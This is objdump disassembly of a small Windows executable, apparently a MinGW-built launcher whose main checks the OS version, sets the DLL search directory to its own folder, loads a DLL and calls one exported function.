  403138:	ff 25 b6 64 00 00    	jmp    *0x64b6(%rip)        # 4095f4 <__imp_strncmp>
  40313e:	90                   	nop
  40313f:	90                   	nop

0000000000403140 <strdup>:
  403140:	ff 25 b6 64 00 00    	jmp    *0x64b6(%rip)        # 4095fc <__imp_strdup>
  403146:	90                   	nop
  403147:	90                   	nop
  403148:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40314f:	00 

0000000000403150 <__acrt_iob_func>:
  403150:	ff 25 5e 64 00 00    	jmp    *0x645e(%rip)        # 4095b4 <__imp___acrt_iob_func>
  403156:	90                   	nop
  403157:	90                   	nop

0000000000403158 <__p__fmode>:
  403158:	ff 25 5e 64 00 00    	jmp    *0x645e(%rip)        # 4095bc <__imp___p__fmode>
  40315e:	90                   	nop
  40315f:	90                   	nop

0000000000403160 <__stdio_common_vfprintf>:
  403160:	ff 25 5e 64 00 00    	jmp    *0x645e(%rip)        # 4095c4 <__imp___stdio_common_vfprintf>
  403166:	90                   	nop
  403167:	90                   	nop

0000000000403168 <__stdio_common_vfwprintf>:
  403168:	ff 25 5e 64 00 00    	jmp    *0x645e(%rip)        # 4095cc <__imp___stdio_common_vfwprintf>
  40316e:	90                   	nop
  40316f:	90                   	nop

0000000000403170 <__stdio_common_vsprintf>:
  403170:	ff 25 5e 64 00 00    	jmp    *0x645e(%rip)        # 4095d4 <__imp___stdio_common_vsprintf>
  403176:	90                   	nop
  403177:	90                   	nop

0000000000403178 <fwrite>:
  403178:	ff 25 5e 64 00 00    	jmp    *0x645e(%rip)        # 4095dc <__imp_fwrite>
  40317e:	90                   	nop
  40317f:	90                   	nop

0000000000403180 <__set_app_type>:
  403180:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 40952c <__imp___set_app_type>
  403186:	90                   	nop
  403187:	90                   	nop

0000000000403188 <__p___argc>:
  403188:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 409534 <__imp___p___argc>
  40318e:	90                   	nop
  40318f:	90                   	nop

0000000000403190 <__p___argv>:
  403190:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 40953c <__imp___p___argv>
  403196:	90                   	nop
  403197:	90                   	nop

0000000000403198 <__p___wargv>:
  403198:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 409544 <__imp___p___wargv>
  40319e:	90                   	nop
  40319f:	90                   	nop

00000000004031a0 <__p__acmdln>:
  4031a0:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 40954c <__imp___p__acmdln>
  4031a6:	90                   	nop
  4031a7:	90                   	nop

00000000004031a8 <_cexit>:
  4031a8:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 409554 <__imp__cexit>
  4031ae:	90                   	nop
  4031af:	90                   	nop

00000000004031b0 <_configure_narrow_argv>:
  4031b0:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 40955c <__imp__configure_narrow_argv>
  4031b6:	90                   	nop
  4031b7:	90                   	nop

00000000004031b8 <_configure_wide_argv>:
  4031b8:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 409564 <__imp__configure_wide_argv>
  4031be:	90                   	nop
  4031bf:	90                   	nop

00000000004031c0 <_crt_atexit>:
  4031c0:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 40956c <__imp__crt_atexit>
  4031c6:	90                   	nop
  4031c7:	90                   	nop

00000000004031c8 <_initialize_narrow_environment>:
  4031c8:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 409574 <__imp__initialize_narrow_environment>
  4031ce:	90                   	nop
  4031cf:	90                   	nop

00000000004031d0 <_initialize_wide_environment>:
  4031d0:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 40957c <__imp__initialize_wide_environment>
  4031d6:	90                   	nop
  4031d7:	90                   	nop

00000000004031d8 <_initterm>:
  4031d8:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 409584 <__imp__initterm>
  4031de:	90                   	nop
  4031df:	90                   	nop

00000000004031e0 <_set_invalid_parameter_handler>:
  4031e0:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 40958c <__imp__set_invalid_parameter_handler>
  4031e6:	90                   	nop
  4031e7:	90                   	nop

00000000004031e8 <abort>:
  4031e8:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 409594 <__imp_abort>
  4031ee:	90                   	nop
  4031ef:	90                   	nop

00000000004031f0 <exit>:
  4031f0:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 40959c <__imp_exit>
  4031f6:	90                   	nop
  4031f7:	90                   	nop

00000000004031f8 <signal>:
  4031f8:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 4095a4 <__imp_signal>
  4031fe:	90                   	nop
  4031ff:	90                   	nop

0000000000403200 <__C_specific_handler>:
  403200:	ff 25 0e 63 00 00    	jmp    *0x630e(%rip)        # 409514 <__imp___C_specific_handler>
  403206:	90                   	nop
  403207:	90                   	nop

0000000000403208 <memcpy>:
  403208:	ff 25 0e 63 00 00    	jmp    *0x630e(%rip)        # 40951c <__imp_memcpy>
  40320e:	90                   	nop
  40320f:	90                   	nop

0000000000403210 <__setusermatherr>:
  403210:	ff 25 ee 62 00 00    	jmp    *0x62ee(%rip)        # 409504 <__imp___setusermatherr>
  403216:	90                   	nop
  403217:	90                   	nop
  403218:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40321f:	00 

0000000000403220 <setlocale>:
  403220:	ff 25 c6 62 00 00    	jmp    *0x62c6(%rip)        # 4094ec <__imp_setlocale>
  403226:	90                   	nop
  403227:	90                   	nop

0000000000403228 <__lconv_init>:
  403228:	ff 25 c6 62 00 00    	jmp    *0x62c6(%rip)        # 4094f4 <__imp___lconv_init>
  40322e:	90                   	nop
  40322f:	90                   	nop

0000000000403230 <_set_new_mode>:
  403230:	ff 25 86 62 00 00    	jmp    *0x6286(%rip)        # 4094bc <__imp__set_new_mode>
  403236:	90                   	nop
  403237:	90                   	nop

0000000000403238 <calloc>:
  403238:	ff 25 86 62 00 00    	jmp    *0x6286(%rip)        # 4094c4 <__imp_calloc>
  40323e:	90                   	nop
  40323f:	90                   	nop

0000000000403240 <free>:
  403240:	ff 25 86 62 00 00    	jmp    *0x6286(%rip)        # 4094cc <__imp_free>
  403246:	90                   	nop
  403247:	90                   	nop

0000000000403248 <malloc>:
  403248:	ff 25 86 62 00 00    	jmp    *0x6286(%rip)        # 4094d4 <__imp_malloc>
  40324e:	90                   	nop
  40324f:	90                   	nop

0000000000403250 <realloc>:
  403250:	ff 25 86 62 00 00    	jmp    *0x6286(%rip)        # 4094dc <__imp_realloc>
  403256:	90                   	nop
  403257:	90                   	nop
  403258:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40325f:	00 

0000000000403260 <__p__environ>:
  403260:	ff 25 3e 62 00 00    	jmp    *0x623e(%rip)        # 4094a4 <__imp___p__environ>
  403266:	90                   	nop
  403267:	90                   	nop

0000000000403268 <__p__wenviron>:
  403268:	ff 25 3e 62 00 00    	jmp    *0x623e(%rip)        # 4094ac <__imp___p__wenviron>
  40326e:	90                   	nop
  40326f:	90                   	nop

0000000000403270 <mbstowcs>:
  403270:	ff 25 16 62 00 00    	jmp    *0x6216(%rip)        # 40948c <__imp_mbstowcs>
  403276:	90                   	nop
  403277:	90                   	nop

0000000000403278 <wcstombs>:
  403278:	ff 25 16 62 00 00    	jmp    *0x6216(%rip)        # 409494 <__imp_wcstombs>
  40327e:	90                   	nop
  40327f:	90                   	nop

0000000000403280 <MessageBoxA>:
  403280:	ff 25 ae 63 00 00    	jmp    *0x63ae(%rip)        # 409634 <__imp_MessageBoxA>
  403286:	90                   	nop
  403287:	90                   	nop
  403288:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40328f:	00 

0000000000403290 <VirtualQuery>:
  403290:	ff 25 e6 61 00 00    	jmp    *0x61e6(%rip)        # 40947c <__imp_VirtualQuery>
  403296:	90                   	nop
  403297:	90                   	nop

0000000000403298 <VirtualProtect>:
  403298:	ff 25 d6 61 00 00    	jmp    *0x61d6(%rip)        # 409474 <__imp_VirtualProtect>
  40329e:	90                   	nop
  40329f:	90                   	nop

00000000004032a0 <VerifyVersionInfoW>:
  4032a0:	ff 25 c6 61 00 00    	jmp    *0x61c6(%rip)        # 40946c <__imp_VerifyVersionInfoW>
  4032a6:	90                   	nop
  4032a7:	90                   	nop

00000000004032a8 <VerSetConditionMask>:
  4032a8:	ff 25 b6 61 00 00    	jmp    *0x61b6(%rip)        # 409464 <__imp_VerSetConditionMask>
  4032ae:	90                   	nop
  4032af:	90                   	nop

00000000004032b0 <UnhandledExceptionFilter>:
  4032b0:	ff 25 a6 61 00 00    	jmp    *0x61a6(%rip)        # 40945c <__imp_UnhandledExceptionFilter>
  4032b6:	90                   	nop
  4032b7:	90                   	nop

00000000004032b8 <TlsGetValue>:
  4032b8:	ff 25 96 61 00 00    	jmp    *0x6196(%rip)        # 409454 <__imp_TlsGetValue>
  4032be:	90                   	nop
  4032bf:	90                   	nop

00000000004032c0 <TerminateProcess>:
  4032c0:	ff 25 86 61 00 00    	jmp    *0x6186(%rip)        # 40944c <__imp_TerminateProcess>
  4032c6:	90                   	nop
  4032c7:	90                   	nop

00000000004032c8 <Sleep>:
  4032c8:	ff 25 76 61 00 00    	jmp    *0x6176(%rip)        # 409444 <__imp_Sleep>
  4032ce:	90                   	nop
  4032cf:	90                   	nop

00000000004032d0 <SetUnhandledExceptionFilter>:
  4032d0:	ff 25 66 61 00 00    	jmp    *0x6166(%rip)        # 40943c <__imp_SetUnhandledExceptionFilter>
  4032d6:	90                   	nop
  4032d7:	90                   	nop

00000000004032d8 <SetDllDirectoryA>:
  4032d8:	ff 25 56 61 00 00    	jmp    *0x6156(%rip)        # 409434 <__imp_SetDllDirectoryA>
  4032de:	90                   	nop
  4032df:	90                   	nop

00000000004032e0 <RtlVirtualUnwind>:
  4032e0:	ff 25 46 61 00 00    	jmp    *0x6146(%rip)        # 40942c <__imp_RtlVirtualUnwind>
  4032e6:	90                   	nop
  4032e7:	90                   	nop

00000000004032e8 <RtlLookupFunctionEntry>:
  4032e8:	ff 25 36 61 00 00    	jmp    *0x6136(%rip)        # 409424 <__imp_RtlLookupFunctionEntry>
  4032ee:	90                   	nop
  4032ef:	90                   	nop

00000000004032f0 <RtlCaptureContext>:
  4032f0:	ff 25 26 61 00 00    	jmp    *0x6126(%rip)        # 40941c <__imp_RtlCaptureContext>
  4032f6:	90                   	nop
  4032f7:	90                   	nop

00000000004032f8 <RtlAddFunctionTable>:
  4032f8:	ff 25 16 61 00 00    	jmp    *0x6116(%rip)        # 409414 <__imp_RtlAddFunctionTable>
  4032fe:	90                   	nop
  4032ff:	90                   	nop

0000000000403300 <QueryPerformanceCounter>:
  403300:	ff 25 06 61 00 00    	jmp    *0x6106(%rip)        # 40940c <__imp_QueryPerformanceCounter>
  403306:	90                   	nop
  403307:	90                   	nop

0000000000403308 <LoadLibraryA>:
  403308:	ff 25 f6 60 00 00    	jmp    *0x60f6(%rip)        # 409404 <__imp_LoadLibraryA>
  40330e:	90                   	nop
  40330f:	90                   	nop

0000000000403310 <LeaveCriticalSection>:
  403310:	ff 25 e6 60 00 00    	jmp    *0x60e6(%rip)        # 4093fc <__imp_LeaveCriticalSection>
  403316:	90                   	nop
  403317:	90                   	nop

0000000000403318 <InitializeCriticalSection>:
  403318:	ff 25 d6 60 00 00    	jmp    *0x60d6(%rip)        # 4093f4 <__imp_InitializeCriticalSection>
  40331e:	90                   	nop
  40331f:	90                   	nop

0000000000403320 <GetTickCount>:
  403320:	ff 25 c6 60 00 00    	jmp    *0x60c6(%rip)        # 4093ec <__imp_GetTickCount>
  403326:	90                   	nop
  403327:	90                   	nop

0000000000403328 <GetSystemTimeAsFileTime>:
  403328:	ff 25 b6 60 00 00    	jmp    *0x60b6(%rip)        # 4093e4 <__imp_GetSystemTimeAsFileTime>
  40332e:	90                   	nop
  40332f:	90                   	nop

0000000000403330 <GetStartupInfoA>:
  403330:	ff 25 a6 60 00 00    	jmp    *0x60a6(%rip)        # 4093dc <__imp_GetStartupInfoA>
  403336:	90                   	nop
  403337:	90                   	nop

0000000000403338 <GetProcAddress>:
  403338:	ff 25 96 60 00 00    	jmp    *0x6096(%rip)        # 4093d4 <__imp_GetProcAddress>
  40333e:	90                   	nop
  40333f:	90                   	nop

0000000000403340 <GetLastError>:
  403340:	ff 25 86 60 00 00    	jmp    *0x6086(%rip)        # 4093cc <__imp_GetLastError>
  403346:	90                   	nop
  403347:	90                   	nop

0000000000403348 <GetCurrentThreadId>:
  403348:	ff 25 76 60 00 00    	jmp    *0x6076(%rip)        # 4093c4 <__imp_GetCurrentThreadId>
  40334e:	90                   	nop
  40334f:	90                   	nop

0000000000403350 <GetCurrentProcessId>:
  403350:	ff 25 66 60 00 00    	jmp    *0x6066(%rip)        # 4093bc <__imp_GetCurrentProcessId>
  403356:	90                   	nop
  403357:	90                   	nop

0000000000403358 <GetCurrentProcess>:
  403358:	ff 25 56 60 00 00    	jmp    *0x6056(%rip)        # 4093b4 <__imp_GetCurrentProcess>
  40335e:	90                   	nop
  40335f:	90                   	nop

0000000000403360 <EnterCriticalSection>:
  403360:	ff 25 46 60 00 00    	jmp    *0x6046(%rip)        # 4093ac <__imp_EnterCriticalSection>
  403366:	90                   	nop
  403367:	90                   	nop

0000000000403368 <DeleteCriticalSection>:
  403368:	ff 25 36 60 00 00    	jmp    *0x6036(%rip)        # 4093a4 <__IAT_start__>
  40336e:	90                   	nop
  40336f:	90                   	nop

0000000000403370 <main>:
  403370:	41 57                	push   %r15
  403372:	b8 20 10 00 00       	mov    $0x1020,%eax
  403377:	41 56                	push   %r14
  403379:	41 55                	push   %r13
  40337b:	41 54                	push   %r12
  40337d:	57                   	push   %rdi
  40337e:	e8 0d f7 ff ff       	call   402a90 <___chkstk_ms>
  403383:	48 29 c4             	sub    %rax,%rsp
  403386:	41 89 ce             	mov    %ecx,%r14d
  403389:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
  40338e:	4c 8d 7c 24 20       	lea    0x20(%rsp),%r15
  403393:	49 89 d5             	mov    %rdx,%r13
  403396:	e8 75 e2 ff ff       	call   401610 <__main>
  40339b:	31 c0                	xor    %eax,%eax
  40339d:	b9 23 00 00 00       	mov    $0x23,%ecx
  4033a2:	41 b8 03 00 00 00    	mov    $0x3,%r8d
  4033a8:	f3 48 ab             	rep stos %rax,(%rdi)
  4033ab:	ba 02 00 00 00       	mov    $0x2,%edx
  4033b0:	48 b8 1c 01 00 00 06 	movabs $0x60000011c,%rax
  4033b7:	00 00 00 
  4033ba:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
  4033c0:	48 8b 3d 9d 60 00 00 	mov    0x609d(%rip),%rdi        # 409464 <__imp_VerSetConditionMask>
  4033c7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  4033cc:	ff d7                	call   *%rdi
  4033ce:	41 b8 03 00 00 00    	mov    $0x3,%r8d
  4033d4:	ba 01 00 00 00       	mov    $0x1,%edx
  4033d9:	48 89 c1             	mov    %rax,%rcx
  4033dc:	ff d7                	call   *%rdi
  4033de:	41 b8 03 00 00 00    	mov    $0x3,%r8d
  4033e4:	ba 20 00 00 00       	mov    $0x20,%edx
  4033e9:	48 89 c1             	mov    %rax,%rcx
  4033ec:	ff d7                	call   *%rdi
  4033ee:	ba 23 00 00 00       	mov    $0x23,%edx
  4033f3:	4c 89 f9             	mov    %r15,%rcx
  4033f6:	49 89 c0             	mov    %rax,%r8
  4033f9:	ff 15 6d 60 00 00    	call   *0x606d(%rip)        # 40946c <__imp_VerifyVersionInfoW>
  4033ff:	41 89 c4             	mov    %eax,%r12d
  403402:	85 c0                	test   %eax,%eax
  403404:	74 78                	je     40347e <main+0x10e>
  403406:	49 8b 4d 00          	mov    0x0(%r13),%rcx
  40340a:	e8 31 fd ff ff       	call   403140 <strdup>
  40340f:	48 89 c1             	mov    %rax,%rcx
  403412:	49 89 c4             	mov    %rax,%r12
  403415:	e8 b6 f6 ff ff       	call   402ad0 <dirname>
  40341a:	4c 8d 05 2e 1c 00 00 	lea    0x1c2e(%rip),%r8        # 40504f <__data_end__+0xf1f>
  403421:	ba 00 10 00 00       	mov    $0x1000,%edx
  403426:	4c 89 f9             	mov    %r15,%rcx
  403429:	49 89 c1             	mov    %rax,%r9
  40342c:	e8 7f fa ff ff       	call   402eb0 <snprintf>
  403431:	4c 89 e1             	mov    %r12,%rcx
  403434:	e8 07 fe ff ff       	call   403240 <free>
  403439:	4c 89 f9             	mov    %r15,%rcx
  40343c:	ff 15 f2 5f 00 00    	call   *0x5ff2(%rip)        # 409434 <__imp_SetDllDirectoryA>
  403442:	48 8d 0d 1c 1c 00 00 	lea    0x1c1c(%rip),%rcx        # 405065 <__data_end__+0xf35>
  403449:	ff 15 b5 5f 00 00    	call   *0x5fb5(%rip)        # 409404 <__imp_LoadLibraryA>
  40344f:	48 8d 15 20 1c 00 00 	lea    0x1c20(%rip),%rdx        # 405076 <__data_end__+0xf46>
  403456:	48 89 c1             	mov    %rax,%rcx
  403459:	ff 15 75 5f 00 00    	call   *0x5f75(%rip)        # 4093d4 <__imp_GetProcAddress>
  40345f:	4c 89 ea             	mov    %r13,%rdx
  403462:	44 89 f1             	mov    %r14d,%ecx
  403465:	ff d0                	call   *%rax
  403467:	41 89 c4             	mov    %eax,%r12d
  40346a:	44 89 e0             	mov    %r12d,%eax
  40346d:	48 81 c4 20 10 00 00 	add    $0x1020,%rsp
  403474:	5f                   	pop    %rdi
  403475:	41 5c                	pop    %r12
  403477:	41 5d                	pop    %r13
  403479:	41 5e                	pop    %r14
  40347b:	41 5f                	pop    %r15
  40347d:	c3                   	ret
  40347e:	45 31 c9             	xor    %r9d,%r9d
  403481:	4c 8d 05 78 1b 00 00 	lea    0x1b78(%rip),%r8        # 405000 <__data_end__+0xed0>
  403488:	48 8d 15 89 1b 00 00 	lea    0x1b89(%rip),%rdx        # 405018 <__data_end__+0xee8>
  40348f:	31 c9                	xor    %ecx,%ecx
  403491:	ff 15 9d 61 00 00    	call   *0x619d(%rip)        # 409634 <__imp_MessageBoxA>
  403497:	eb d1                	jmp    40346a <main+0xfa>
  403499:	90                   	nop
  40349a:	90                   	nop
  40349b:	90                   	nop
  40349c:	90                   	nop
  40349d:	90                   	nop
  40349e:	90                   	nop
  40349f:	90                   	nop
  4034a0:	e9 9b e0 ff ff       	jmp    401540 <__gcc_register_frame>
  4034a5:	90                   	nop
  4034a6:	90                   	nop
  4034a7:	90                   	nop
  4034a8:	90                   	nop
  4034a9:	90                   	nop
  4034aa:	90                   	nop
  4034ab:	90                   	nop
  4034ac:	90                   	nop
  4034ad:	90                   	nop
  4034ae:	90                   	nop
  4034af:	90                   	nop

00000000004034b0 <__CTOR_LIST__>:
  4034b0:	ff                   	(bad)
  4034b1:	ff                   	(bad)
  4034b2:	ff                   	(bad)
  4034b3:	ff                   	(bad)
  4034b4:	ff                   	(bad)
  4034b5:	ff                   	(bad)
  4034b6:	ff                   	(bad)
  4034b7:	ff a0 34 40 00 00    	jmp    *0x4034(%rax)
	...

00000000004034c8 <__DTOR_LIST__>:
  4034c8:	ff                   	(bad)
  4034c9:	ff                   	(bad)
  4034ca:	ff                   	(bad)
  4034cb:	ff                   	(bad)
  4034cc:	ff                   	(bad)
  4034cd:	ff                   	(bad)
  4034ce:	ff                   	(bad)
  4034cf:	ff 00                	incl   (%rax)
  4034d1:	00 00                	add    %al,(%rax)
  4034d3:	00 00                	add    %al,(%rax)
  4034d5:	00 00                	add    %al,(%rax)
	...
